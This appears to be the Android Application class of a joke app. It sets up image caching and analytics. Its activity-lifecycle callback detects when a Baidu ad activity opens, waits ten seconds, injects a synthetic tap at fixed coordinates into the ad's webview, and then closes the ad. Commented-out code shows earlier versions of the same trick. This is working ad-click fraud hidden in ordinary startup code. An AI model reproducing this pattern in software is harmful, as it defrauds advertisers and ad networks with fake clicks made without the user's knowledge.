package com.helen.dayjoke.ui.application;

import android.app.Activity;
import android.app.Application;
import android.os.Bundle;
import android.os.Handler;
import android.os.SystemClock;
import android.view.MotionEvent;

import com.baidu.mobads.AppActivity;
import com.facebook.cache.disk.DiskCacheConfig;
import com.facebook.drawee.backends.pipeline.Fresco;
import com.facebook.imagepipeline.core.ImagePipelineConfig;
import com.helen.dayjoke.BuildConfig;
import com.helen.dayjoke.utils.EnvironmentUtil;
import com.umeng.analytics.MobclickAgent;


/**
 * Created by Helen on 2016/4/28.
 *
 */
public class DJApplication extends Application implements Application.ActivityLifecycleCallbacks{
    private static DJApplication instance;
    private Handler mHandler;
    @Override
    public void onCreate() {
        super.onCreate();
        String processName = EnvironmentUtil.getProcessName(this,android.os.Process.myPid());
        if(getPackageName().equals(processName)){
            init();
        }
    }

    private void init(){
        instance = this;
        HCrashHandler.init(this);
        initFresco();
        initUmeng();
        registerActivityLifecycleCallbacks(this);
        mHandler = new Handler();
    }

    private void initUmeng() {
        MobclickAgent.setDebugMode(BuildConfig.DEBUG);
        //MobclickAgent.openActivityDurationTrack(false);
        MobclickAgent.enableEncrypt(true);
        MobclickAgent.setCheckDevice(false);
        MobclickAgent.setScenarioType(this, MobclickAgent.EScenarioType.E_UM_NORMAL);
    }


    private void initFresco(){
        DiskCacheConfig diskCacheConfig = DiskCacheConfig.newBuilder(this)
                .setBaseDirectoryPath(EnvironmentUtil.getCacheFile())
                .setBaseDirectoryName(Constant.CACHE_IMAGE)
                .setMaxCacheSize(Constant.MAX_CACHE_SIZE)
                .setMaxCacheSizeOnLowDiskSpace(Constant.LOW_CACHE_SIZE)
                .setMaxCacheSizeOnVeryLowDiskSpace(Constant.VERY_LOW_CACHE_SIZE)
                .build();
        ImagePipelineConfig config = ImagePipelineConfig.newBuilder(this)
                .setMainDiskCacheConfig(diskCacheConfig).build();
        Fresco.initialize(this, config);
        //清理fresco缓存
        //Fresco.getImagePipeline().clearCaches();
    }

    public static DJApplication getInstance() {
        return instance;
    }

    @Override
    public void onActivityCreated(final Activity activity, Bundle savedInstanceState) {
        if(activity instanceof com.baidu.mobads.AppActivity){
            //activity.
            /*long downTime = SystemClock.uptimeMillis();
            MotionEvent downEvent = MotionEvent.obtain(downTime,downTime,MotionEvent.ACTION_DOWN,150,150,0);
            activity.onTouchEvent(downEvent);
            long upTime = SystemClock.uptimeMillis();
            MotionEvent upEvent = MotionEvent.obtain(upTime,upTime,MotionEvent.ACTION_UP,150,150,0);
            activity.onTouchEvent(upEvent);*/
            /*mHandler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    activity.finish();
                }
            },15000);*/
        }
    }

    @Override
    public void onActivityStarted(final Activity activity) {
        if(activity instanceof com.baidu.mobads.AppActivity){
            mHandler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    AppActivity appActivity = (AppActivity)activity;
                    long downTime = SystemClock.uptimeMillis();
                    MotionEvent downEvent = MotionEvent.obtain(downTime,downTime,MotionEvent.ACTION_DOWN,231.67822f,235.70493f,0);
                    appActivity.curWebview.dispatchTouchEvent(downEvent);
                    long upTime = SystemClock.uptimeMillis();
                    MotionEvent upEvent = MotionEvent.obtain(upTime,upTime,MotionEvent.ACTION_UP,231.67822f,235.70493f,0);
                    appActivity.curWebview.dispatchTouchEvent(upEvent);
                    mHandler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            /*AppActivity appActivity = (AppActivity) activity;
                            appActivity.curWebview.goBack();*/
                            activity.finish();
                        }
                    }, 5000);
                }
            },10*1000);

        }
    }

    @Override
    public void onActivityResumed(Activity activity) {

    }

    @Override
    public void onActivityPaused(final Activity activity) {

    }

    @Override
    public void onActivityStopped(Activity activity) {

    }

    @Override
    public void onActivitySaveInstanceState(Activity activity, Bundle outState) {

    }

    @Override
    public void onActivityDestroyed(Activity activity) {

    }

}
